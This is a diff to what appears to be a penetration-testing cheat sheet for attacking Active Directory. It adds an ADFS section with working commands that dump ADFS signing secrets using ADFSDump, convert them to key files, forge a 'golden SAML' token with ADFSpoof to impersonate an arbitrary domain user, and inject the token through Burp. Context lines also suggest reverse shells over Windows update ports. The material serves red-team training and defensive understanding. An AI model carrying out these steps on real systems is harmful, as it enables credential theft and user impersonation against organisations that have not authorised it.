@@ -61,8 +61,9 @@
   * [Database links](#Database-links)
   * [Data exfiltration](#Data-exfiltration)
   * [SQL Queries](#SQL-Queries)
-* [WSUS](#Attacking-WSUS)
-* [SCCM](#SCCM)
+* [Windows Server Update Services WSUS](#WSUS)
+* [Microsoft System Center Configuration Manager SCCM](#SCCM)
+* [Active Directory Federation Services](#ADFS)
 * [Child to Parent](#Child-to-Parent)
   * [Kerberos](#Kerberos)
   * [Azure AD](#Azure-AD)
@@ -2088,7 +2089,7 @@ SELECT IS_SRVROLEMEMBER('sysadmin','<USER>')
 SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals  WHERE    IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name
 ```
 
-## Attacking WSUS
+## WSUS
 - Windows update ports are 8530 and 8531, when creating a rev shell use those if the network is tight/airgapped!
 
 ### Enumeration
@@ -2272,6 +2273,32 @@ MalSCCM.exe inspect /computers
 MalSCCM.exe inspect /primaryusers
 MalSCCM.exe inspect /groups
 ```
+
+## ADFS
+- https://github.com/mandiant/ADFSDump
+- https://github.com/szymex73/ADFSpoof
+
+#### Dump ADFS secrets
+- Requires to be ran from the ADFS service account on the ADFS server.
+```
+.\ADFSDump.exe
+```
+
+#### Save & trim output
+- Save the `Private key` as `DKMkey.txt` and `Encrypted token` as `TKSKey.txt`
+```
+cat TKSKey.txt | base64 -d > TKSKey.bin
+cat DKMkey.txt | tr -d "-" | xxd -r -p > DKMkey.bin
+```
+
+#### Create golden SAML token for another service
+- Example command! Most info is extracted from the ADFSDump
+```
+python3 ADFSpoof.py -b TKSKey.bin DKMkey.bin -s adfs.<DOMAIN>.local saml2 --endpoint 'https://servicedesk.<DOMAIN>.local/SamlResponseServlet' --nameidformat 'urn:oasis:names:tc:SAML:2.0:nameid-format:transient' --nameid '<DOMAIN>\<USER TO IMPERSONATE>' --rpidentifier 'ME_29472ca9-86f2-4376-bc09-c51aa974bfef' --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier"><AttributeValue><DOMAIN>\<USER TO IMPERSONATE></AttributeValue></Attribute>'
+```
+
+#### Inject golden SAML token
+- Intercept with burp and inject inside SAMLResponse.
  
 ## Child to Parent
 ### Kerberos
